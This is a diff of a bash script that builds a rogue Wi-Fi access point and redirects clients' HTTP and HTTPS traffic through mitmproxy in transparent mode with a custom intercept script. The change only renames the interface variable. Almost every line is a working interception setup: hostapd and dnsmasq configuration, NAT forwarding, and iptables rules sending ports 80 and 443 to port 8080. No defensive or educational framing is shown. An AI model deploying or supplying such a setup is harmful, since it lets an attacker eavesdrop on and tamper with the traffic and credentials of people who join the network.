@@ -8,7 +8,6 @@ fi
 
 # Variables
 INTERFACE="wlan0"       # Wireless interface
-MONITOR_INTERFACE="wlan0" # Monitor mode interface created by airmon-ng
 GATEWAY="192.168.1.1"
 SUBNET="255.255.255.0"
 ETH_INTERFACE="eth0"    # Ethernet/WAN interface
@@ -26,7 +25,7 @@ airmon-ng start $INTERFACE
 # Configure hostapd
 echo "Configuring hostapd..."
 cat <<EOF > $HOSTAPD_CONF
-interface=$MONITOR_INTERFACE
+interface=$INTERFACE
 wpa=2
 wpa_passphrase=mqpsucks
 wpa_pairwise=TKIP CCMP
@@ -39,7 +38,7 @@ EOF
 # Configure dnsmasq
 echo "Configuring dnsmasq..."
 cat <<EOF > $DNSMASQ_CONF
-interface=$MONITOR_INTERFACE
+interface=$INTERFACE
 dhcp-range=192.168.1.50,192.168.1.150,$SUBNET,12h
 dhcp-option=3,$GATEWAY
 dhcp-option=6,$GATEWAY
@@ -58,7 +57,7 @@ gnome-terminal -- bash -c "echo 'Starting hostapd...'; hostapd $HOSTAPD_CONF; ex
 # Terminal 2: Configure interface, route, and start dnsmasq
 gnome-terminal -- bash -c "
     echo 'Configuring interface and starting dnsmasq...';
-    ifconfig $MONITOR_INTERFACE up $GATEWAY netmask $SUBNET;
+    ifconfig $INTERFACE up $GATEWAY netmask $SUBNET;
     route add -net 192.168.1.0 netmask $SUBNET gw $GATEWAY;
     dnsmasq -C $DNSMASQ_CONF -d;
     exec bash
@@ -68,12 +67,12 @@ gnome-terminal -- bash -c "
 gnome-terminal -- bash -c "
     echo 'Setting up iptables and enabling IP forwarding...';
     iptables -t nat -A POSTROUTING -o $ETH_INTERFACE -j MASQUERADE;
-    iptables -A FORWARD -i $MONITOR_INTERFACE -j ACCEPT;
+    iptables -A FORWARD -i $INTERFACE -j ACCEPT;
     echo 1 > /proc/sys/net/ipv4/ip_forward;
     
-    iptables -t nat -A POSTROUTING -o $MONITOR_INTERFACE -j MASQUERADE;
-    iptables -t nat -A PREROUTING -i $MONITOR_INTERFACE  -p tcp --dport 443 -j REDIRECT --to-port 8080;
-    iptables -t nat -A PREROUTING -i $MONITOR_INTERFACE -p tcp --dport 80 -j REDIRECT --to-port 8080;
+    iptables -t nat -A POSTROUTING -o $INTERFACE -j MASQUERADE;
+    iptables -t nat -A PREROUTING -i $INTERFACE  -p tcp --dport 443 -j REDIRECT --to-port 8080;
+    iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 80 -j REDIRECT --to-port 8080;
     mitmproxy -s intercept.py --ssl-insecure --mode transparent
     exec bash
 "
